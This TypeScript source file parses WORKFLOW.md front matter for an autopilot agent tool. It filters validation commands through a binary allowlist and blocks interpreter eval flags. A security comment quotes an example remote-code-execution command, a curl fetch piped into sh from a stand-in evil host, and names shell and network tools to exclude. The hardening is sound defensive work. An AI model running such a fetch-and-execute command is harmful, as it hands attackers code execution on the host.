/**
 * M2.2: Workflow config parser
 *
 * Parses WORKFLOW.md YAML front matter for autopilot configuration.
 * Lookup order: workspacePath/WORKFLOW.md -> baseRepoPath/WORKFLOW.md -> default config.
 */
import * as fs from 'fs';
import * as path from 'path';
import type { WorkflowConfig, ValidationCommand } from './types';
import { parseModelRouting } from './model-routing';
import { tokenizeShell } from '@oh-my-matrix/permission-policy';
import { DEFAULT_RETRY_JITTER } from './retry-queue';

export const DEFAULT_WORKFLOW_CONFIG: WorkflowConfig = {
  version: 1,
  source: 'default',
  maxConcurrent: 5,
  maxRetries: 3,
  stallTimeoutMs: 300_000,
  maxRetryBackoffMs: 300_000,
  // E3: single source of truth — DEFAULT_RETRY_JITTER (retry-queue.ts). Review
  // follow-up: previously a hardcoded 0.2 here shadowed the exported constant.
  retryJitter: DEFAULT_RETRY_JITTER,
  // E6/P0-6 dir-2: consecutive no-output turns before the no-progress pause.
  noProgressTurns: 3,
  // E7/P0-4: run validation every N turns (not just complete). 0 disables.
  midrunValidationInterval: 5,
  workspace: {
    // E9/ADR-008: `root` removed (never consumed at runtime; worktree mgmt delegated to host).
    cleanup: 'manual',
    branchPrefix: 'autopilot',
    allowDirtyBase: false,
  },
  validation: {
    commands: [],
    failOnOptional: false,
  },
  destructiveGit: {
    allow: false,
  },
  warnings: [],
};

interface LoadResult {
  config: WorkflowConfig;
  warnings: string[];
}

/**
 * S1 (audit 2026-06-30): allowlist of binaries permitted in WORKFLOW.md
 * `validation.commands`. WORKFLOW.md is an attacker-controllable input (it lives
 * in the workspace, not the operator's config), and these commands run via
 * execFile on the autopilot `complete` path — without this filter, a malicious
 * workspace could achieve RCE by committing `command: "curl evil.sh | sh"`.
 *
 * Fail-closed: anything not listed is dropped + warned. Intentionally excludes
 * `bash`/`sh`/`curl`/`wget`/`nc`/arbitrary binaries. Residual surface: an
 * allowlisted interpreter (e.g. `python -c "..."`) can still run arbitrary code
 * via its own flags; narrowing that requires argument inspection, tracked as a
 * follow-up. The binary gate already removes the "any binary, zero friction"
 * RCE path that existed before.
 */
const ALLOWED_VALIDATION_BINARIES: ReadonlySet<string> = new Set([
  'npm', 'pnpm', 'yarn', 'npx', 'node', 'node.exe',
  'tsc', 'tsx', 'eslint', 'prettier', 'markdownlint', 'markdownlint-cli2',
  'vitest', 'jest', 'mocha', 'vite', 'webpack', 'rollup', 'esbuild',
  'go', 'cargo', 'rustc',
  'python', 'python3', 'pytest', 'pip', 'pip3',
  'make', 'cmake', 'dotnet', 'msbuild',
  'gradle', 'mvn', 'rake', 'bundle', 'swift', 'xcodebuild',
]);

/** S1-B: interpreters that can execute an arbitrary string passed as a flag. */
const INTERPRETER_BINARIES: ReadonlySet<string> = new Set(['node', 'python', 'python3']);
/** S1-B: flags that make those interpreters run an arbitrary string. */
const DANGEROUS_EVAL_FLAGS: ReadonlySet<string> = new Set([
  '-e', '--eval', '-c', '--command', '--exec', '-p', '--print',
]);

/**
 * S1: drop validation commands whose binary is not on the allowlist, and
 * (S1-B) drop interpreter commands that pass an eval flag (-e/-c/--eval…)
 * even when the binary itself is allowlisted. Mutates `warnings` with one
 * entry per dropped command for observability.
 *
 * Note: this cannot stop `npm run <script>` / `node script.js` where the
 * workspace owns the script — that path is gated by the trustWorkspace opt-in
 * in applyWorkflowConfig (the root-cause boundary), not by this filter.
 */
function filterValidationCommands(
  commands: ValidationCommand[],
  warnings: string[],
): ValidationCommand[] {
  const kept: ValidationCommand[] = [];
  for (const cmd of commands) {
    const tokens = tokenizeShell(cmd.command);
    const bin = tokens[0]?.toLowerCase();
    if (!bin || !ALLOWED_VALIDATION_BINARIES.has(bin)) {
      warnings.push(
        `Disallowed validation binary "${bin ?? '(empty)'}" in command "${cmd.command.substring(0, 80)}" — dropped (S1 fail-closed)`,
      );
      continue;
    }
    if (INTERPRETER_BINARIES.has(bin)) {
      const hasEvalFlag = tokens.slice(1).some((a) => {
        const flag = a.split('=')[0];
        return DANGEROUS_EVAL_FLAGS.has(flag) || DANGEROUS_EVAL_FLAGS.has(a);
      });
      if (hasEvalFlag) {
        warnings.push(
          `Disallowed eval flag on ${bin} in "${cmd.command.substring(0, 80)}" — dropped (S1-B)`,
        );
        continue;
      }
    }
    kept.push(cmd);
  }
  return kept;
}

/**
 * Parse a YAML-like autopilot section from front matter.
 * Minimal parser — only handles the autopilot schema we define.
 * Not a general-purpose YAML parser.
 */
function parseAutopilotSection(raw: Record<string, unknown>): {
  config: Partial<WorkflowConfig>;
  warnings: string[];
} {
  const warnings: string[] = [];
  const result: Partial<WorkflowConfig> = {};

  // Track unknown fields
  const knownKeys = new Set([
    'version', 'max_concurrent', 'max_retries',
    'stall_timeout_ms', 'max_retry_backoff_ms', 'retry_jitter', 'no_progress_turns', 'midrun_validation_interval', 'workspace', 'validation',
    'destructive_git', 'model_routing',
  ]);
  for (const key of Object.keys(raw)) {
    if (!knownKeys.has(key)) {
      warnings.push(`Unknown field: ${key}`);
    }
  }

  if ('version' in raw) {
    if (raw.version !== 1) {
      warnings.push(`Unsupported version: ${raw.version}, expected 1`);
    }
    result.version = 1;
  } else {
    warnings.push('Missing version field, defaulting to 1');
  }

  if ('max_concurrent' in raw && typeof raw.max_concurrent === 'number') {
    result.maxConcurrent = raw.max_concurrent;
  }

  if ('max_retries' in raw && typeof raw.max_retries === 'number') {
    result.maxRetries = raw.max_retries;
  }

  if ('stall_timeout_ms' in raw && typeof raw.stall_timeout_ms === 'number') {
    result.stallTimeoutMs = raw.stall_timeout_ms;
  }

  if ('max_retry_backoff_ms' in raw && typeof raw.max_retry_backoff_ms === 'number') {
    result.maxRetryBackoffMs = raw.max_retry_backoff_ms;
  }

  if ('retry_jitter' in raw && typeof raw.retry_jitter === 'number') {
    // Clamp to [0, 1]: a jitter fraction outside that range is nonsensical and
    // could invert or zero the delay. Fail-safe to the default rather than drop.
    result.retryJitter = Math.min(Math.max(raw.retry_jitter, 0), 1);
  }

  if ('no_progress_turns' in raw && typeof raw.no_progress_turns === 'number') {
    // 0 disables the no-progress pause; otherwise require at least 1 turn.
    result.noProgressTurns = Math.max(0, Math.floor(raw.no_progress_turns));
  }

  if ('midrun_validation_interval' in raw && typeof raw.midrun_validation_interval === 'number') {
    // 0 disables mid-run validation; otherwise require at least 1.
    result.midrunValidationInterval = Math.max(0, Math.floor(raw.midrun_validation_interval));
  }

  if ('workspace' in raw && typeof raw.workspace === 'object' && raw.workspace !== null) {
    const ws = raw.workspace as Record<string, unknown>;
    // E9/ADR-008: workspace.root is removed (autopilot delegates worktree management
    // to the host; root was never consumed at runtime). Warn on its presence so
    // existing WORKFLOW.md files get migration feedback rather than a silent drop.
    // NOTE: state.workspace.root (WorkspaceRecord) is a DIFFERENT field — the
    // checkpoint root (P0-2/E1) — and is untouched here.
    if ('root' in ws) {
      warnings.push('workspace.root is no longer supported (removed per ADR-008; autopilot delegates worktree management to the host) — remove this line from WORKFLOW.md');
    }
    result.workspace = {
      cleanup: ws.cleanup === 'delete_on_done' ? 'delete_on_done' : 'manual',
      branchPrefix: typeof ws.branch_prefix === 'string' ? ws.branch_prefix : 'autopilot',
      baseRef: typeof ws.base_ref === 'string' ? ws.base_ref : undefined,
      allowDirtyBase: ws.allow_dirty_base === true,
    };
  }

  if ('validation' in raw && typeof raw.validation === 'object' && raw.validation !== null) {
    const val = raw.validation as Record<string, unknown>;
    const commands: ValidationCommand[] = [];

    if (Array.isArray(val.commands)) {
      for (const cmd of val.commands) {
        if (typeof cmd === 'object' && cmd !== null) {
          const c = cmd as Record<string, unknown>;
          if (typeof c.id === 'string' && typeof c.command === 'string') {
            commands.push({
              id: c.id,
              command: c.command,
              timeoutMs: typeof c.timeout_ms === 'number' ? c.timeout_ms : 120_000,
              required: c.required !== false,
            });
          }
        }
      }
    }

    result.validation = {
      commands: filterValidationCommands(commands, warnings),
      failOnOptional: val.fail_on_optional === true,
    };
  }

  if ('destructive_git' in raw && typeof raw.destructive_git === 'object' && raw.destructive_git !== null) {
    const dg = raw.destructive_git as Record<string, unknown>;
    result.destructiveGit = {
      allow: dg.allow === true,
    };
  }

  if ('model_routing' in raw) {
    const routing = parseModelRouting(raw.model_routing);
    if (routing) result.modelRouting = routing;
  }

  return { config: result, warnings };
}

/**
 * Extract YAML front matter from markdown content.
 * Returns the parsed object or null if no valid front matter found.
 */
function extractFrontMatter(content: string): Record<string, unknown> | null {
  // Normalise CRLF → LF so Windows-edited files parse identically to Unix files (X-7, X-8)
  const normalised = content.replace(/\r\n/g, '\n');
  const match = normalised.match(/^---\s*\n([\s\S]*?)\n---/);
  if (!match) return null;

  const yaml = match[1];
  // Minimal YAML parsing for our flat autopilot schema
  // We use a simple approach: find the autopilot: key and parse its block
  try {
    return parseSimpleYaml(yaml);
  } catch {
    return null;
  }
}

/**
 * Very simple YAML parser that handles our specific autopilot schema.
 * Not a general YAML parser — only handles nested objects, arrays, and scalars.
 */
function parseSimpleYaml(yaml: string): Record<string, unknown> {
  const lines = yaml.split('\n');
  const root: Record<string, unknown> = {};
  let i = 0;

  function parseValue(indent: number): unknown {
    // PROD-9: skip blank/comment lines iteratively — recursing once per line
    // could blow the stack on a WORKFLOW.md with thousands of blank lines.
    while (i < lines.length) {
      const t = lines[i].trimStart();
      if (t === '' || t.startsWith('#')) { i++; continue; }
      break;
    }
    if (i >= lines.length) return null;
    const line = lines[i];
    const trimmed = line.trimStart();

    // Array item
    if (trimmed.startsWith('- ')) {
      const items: unknown[] = [];
      while (i < lines.length) {
        const l = lines[i];
        const t = l.trimStart();
        const currentIndent = l.length - t.length;
        if (currentIndent < indent) break;
        if (t.startsWith('- ')) {
          i++;
          const itemStr = t.substring(2).trim();
          if (itemStr.includes(':')) {
            // Inline object or nested object
            // Check if next lines are indented further
            const itemObj: Record<string, unknown> = {};
            // Try inline key: value
            const inlineMatch = itemStr.match(/^(\w[\w_-]*):\s*(.*)/);
            if (inlineMatch) {
              const k = inlineMatch[1];
              const v = inlineMatch[2].trim();
              if (v === '' || v === '|' || v === '>') {
                // Nested object
                const subIndent = currentIndent + 2;
                const sub: Record<string, unknown> = {};
                while (i < lines.length) {
                  const sl = lines[i];
                  const st = sl.trimStart();
                  const si = sl.length - st.length;
                  if (si < subIndent || st === '' || st.startsWith('#')) break;
                  const kv = st.match(/^(\w[\w_-]*):\s*(.*)/);
                  if (kv) {
                    i++;
                    const key = kv[1];
                    const val = kv[2].trim();
                    if (val === '') {
                      // Deeper nesting — not needed for our schema
                    } else {
                      sub[key] = parseScalar(val);
                    }
                  } else {
                    i++;
                  }
                }
                itemObj[k] = sub;
              } else {
                itemObj[k] = parseScalar(v);
              }
            }
            // Continue parsing key: value pairs at this indent level
            while (i < lines.length) {
              const nl = lines[i];
              const nt = nl.trimStart();
              const ni = nl.length - nt.length;
              const expectedIndent = currentIndent + 2;
              if (ni < expectedIndent || nt === '' || nt.startsWith('#')) break;
              if (nt.startsWith('- ')) break;
              const kv = nt.match(/^(\w[\w_-]*):\s*(.*)/);
              if (kv) {
                i++;
                itemObj[kv[1]] = parseScalar(kv[2].trim());
              } else {
                i++;
              }
            }
            items.push(itemObj);
          } else {
            items.push(parseScalar(itemStr));
          }
        } else {
          break;
        }
      }
      return items;
    }

    // Object: parse key: value pairs at this indent level
    const obj: Record<string, unknown> = {};
    while (i < lines.length) {
      const l = lines[i];
      const t = l.trimStart();
      const ci = l.length - t.length;
      if (ci < indent && l.trim() !== '') break;
      if (t === '' || t.startsWith('#')) { i++; continue; }
      if (t.startsWith('- ')) break;
      const kv = t.match(/^(\w[\w_-]*):\s*(.*)/);
      if (kv) {
        const key = kv[1];
        const val = kv[2].trim();
        i++;
        if (val === '' || val === '|' || val === '>') {
          // Nested block — check next line indent
          if (i < lines.length) {
            const nextLine = lines[i];
            const nextIndent = nextLine.length - nextLine.trimStart().length;
            if (nextIndent > ci) {
              obj[key] = parseValue(nextIndent);
            } else {
              obj[key] = null;
            }
          } else {
            obj[key] = null;
          }
        } else {
          obj[key] = parseScalar(val);
        }
      } else {
        i++;
      }
    }
    return obj;
  }

  // Parse root level
  while (i < lines.length) {
    const line = lines[i];
    const trimmed = line.trimStart();
    if (trimmed === '' || trimmed.startsWith('#')) { i++; continue; }
    const kv = trimmed.match(/^(\w[\w_-]*):\s*(.*)/);
    if (kv) {
      const key = kv[1];
      const val = kv[2].trim();
      i++;
      if (val === '' || val === '|' || val === '>') {
        // Nested block
        if (i < lines.length) {
          const nextLine = lines[i];
          const nextIndent = nextLine.length - nextLine.trimStart().length;
          const currentIndent = line.length - trimmed.length;
          if (nextIndent > currentIndent) {
            root[key] = parseValue(nextIndent);
          } else {
            root[key] = null;
          }
        } else {
          root[key] = null;
        }
      } else {
        root[key] = parseScalar(val);
      }
    } else {
      i++;
    }
  }

  return root;
}

function parseScalar(val: string): unknown {
  if (val === 'true') return true;
  if (val === 'false') return false;
  if (val === 'null' || val === '~') return null;
  // Remove quotes
  if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
    return val.slice(1, -1);
  }
  // Try number
  const num = Number(val);
  if (!isNaN(num) && val !== '') return num;
  return val;
}

/**
 * Load workflow config from WORKFLOW.md in the given repo path.
 * Returns default config if no WORKFLOW.md exists or if parsing fails.
 */
export function loadWorkflowConfig(baseRepoPath: string, workspacePath?: string): LoadResult {
  // Lookup order: workspacePath/WORKFLOW.md -> baseRepoPath/WORKFLOW.md -> default
  const searchPaths = workspacePath
    ? [path.join(workspacePath, 'WORKFLOW.md'), path.join(baseRepoPath, 'WORKFLOW.md')]
    : [path.join(baseRepoPath, 'WORKFLOW.md')];

  const ioWarnings: string[] = [];

  for (const filePath of searchPaths) {
    if (!fs.existsSync(filePath)) continue;

    try {
      const content = fs.readFileSync(filePath, 'utf-8');
      const parsed = extractFrontMatter(content);

      if (!parsed || !('autopilot' in parsed)) {
        // File exists but no autopilot section — treat as missing
        continue;
      }

      const autopilot = parsed.autopilot;
      if (typeof autopilot !== 'object' || autopilot === null) {
        // Invalid autopilot section (e.g., autopilot: {})
        if (autopilot === null || (typeof autopilot === 'object' && Object.keys(autopilot).length === 0)) {
          // autopilot: {} or autopilot: null — use defaults but mark as workflow_md source
          // REV-4: surface I/O warnings from earlier-failed candidate paths.
          return {
            config: { ...DEFAULT_WORKFLOW_CONFIG, source: 'workflow_md', warnings: ioWarnings },
            warnings: ioWarnings,
          };
        }
        continue;
      }

      const { config: partial, warnings } = parseAutopilotSection(autopilot as Record<string, unknown>);
      const merged: WorkflowConfig = {
        ...DEFAULT_WORKFLOW_CONFIG,
        ...partial,
        source: 'workflow_md',
        workspace: { ...DEFAULT_WORKFLOW_CONFIG.workspace, ...partial.workspace },
        validation: { ...DEFAULT_WORKFLOW_CONFIG.validation, ...partial.validation },
        destructiveGit: { ...DEFAULT_WORKFLOW_CONFIG.destructiveGit, ...partial.destructiveGit },
        warnings: [...ioWarnings, ...warnings],
      };

      // REV-4: surface I/O warnings from earlier-failed candidate paths alongside
      // the parse-section warnings so the user sees "first file failed, used second".
      return { config: merged, warnings: [...ioWarnings, ...warnings] };
    } catch (err) {
      ioWarnings.push(`Failed to read/parse ${filePath}: ${err instanceof Error ? err.message : String(err)}`);
      continue;
    }
  }

  return { config: DEFAULT_WORKFLOW_CONFIG, warnings: ioWarnings };
}
